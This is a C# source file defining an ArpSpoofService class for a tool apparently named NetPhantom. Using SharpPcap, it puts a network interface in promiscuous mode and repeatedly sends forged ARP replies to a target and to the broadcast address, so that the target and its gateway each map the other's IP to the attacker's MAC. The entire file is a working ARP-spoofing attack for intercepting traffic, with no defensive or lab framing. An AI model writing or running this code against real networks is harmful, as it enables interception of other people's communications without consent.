using System;
using System.Linq;
using System.Net;
using System.Net.NetworkInformation;
using System.Threading;
using System.Threading.Tasks;
using PacketDotNet;
using Serilog;
using SharpPcap;

namespace NetPhantom.Services;

public class ArpSpoofService : IDisposable
{
    private readonly ILiveDevice _device;
    private CancellationTokenSource? _cts;
    private Task? _spoofTask;
    private bool _disposed;

    public int PacketsSent { get; private set; }
    public DateTime? LastSentAt { get; private set; }
    public event EventHandler<string>? LogMessage;

    public ArpSpoofService(ILiveDevice device) { _device = device; }

    public void Start(string localMac, string targetIp, string targetMac, string gatewayIp, int intervalMs = 1000)
    {
        if (_spoofTask is { IsCompleted: false })
            throw new InvalidOperationException("Spoofer already running.");
        PacketsSent = 0;
        _cts = new CancellationTokenSource();
        var ct = _cts.Token;
        _device.Open(DeviceModes.Promiscuous);
        Log.Information("ARP spoof started: target={Target}, gateway={Gateway}", targetIp, gatewayIp);
        LogMessage?.Invoke(this, $"Started spoofing {targetIp} ↔ {gatewayIp}");
        _spoofTask = Task.Run(async () =>
        {
            while (!ct.IsCancellationRequested)
            {
                try
                {
                    SendArpReply(_device, localMac, gatewayIp, targetIp, targetMac);
                    SendArpReply(_device, localMac, targetIp, gatewayIp, "FF:FF:FF:FF:FF:FF");
                    PacketsSent += 2;
                    LastSentAt = DateTime.Now;
                    LogMessage?.Invoke(this, $"[{LastSentAt:HH:mm:ss}] Packets sent: {PacketsSent}");
                }
                catch (Exception ex) { Log.Error(ex, "ARP spoof send error"); }
                await Task.Delay(intervalMs, ct).ConfigureAwait(false);
            }
        }, ct);
    }

    public async Task StopAsync()
    {
        _cts?.Cancel();
        if (_spoofTask != null) await _spoofTask.ConfigureAwait(false);
        try { _device.Close(); } catch { }
        LogMessage?.Invoke(this, $"Stopped. Total packets sent: {PacketsSent}");
    }

    private static void SendArpReply(ILiveDevice device, string senderMac, string senderIp, string targetIp, string targetMac)
    {
        var senderBytes = ParseMac(senderMac);
        var targetBytes = targetMac == "FF:FF:FF:FF:FF:FF"
            ? new byte[] { 0xFF, 0xFF, 0xFF, 0xFF, 0xFF, 0xFF } : ParseMac(targetMac);
        var arp = new ArpPacket(ArpOperation.Response,
            new PhysicalAddress(targetBytes), IPAddress.Parse(targetIp),
            new PhysicalAddress(senderBytes), IPAddress.Parse(senderIp));
        var eth = new EthernetPacket(new PhysicalAddress(senderBytes),
            new PhysicalAddress(targetBytes), EthernetType.Arp) { PayloadPacket = arp };
        device.SendPacket(eth);
    }

    private static byte[] ParseMac(string mac) =>
        mac.Split(':', '-').Select(p => Convert.ToByte(p, 16)).ToArray();

    public void Dispose()
    {
        if (_disposed) return;
        _disposed = true;
        _cts?.Cancel();
        _cts?.Dispose();
        try { _device.Close(); } catch { }
    }
}
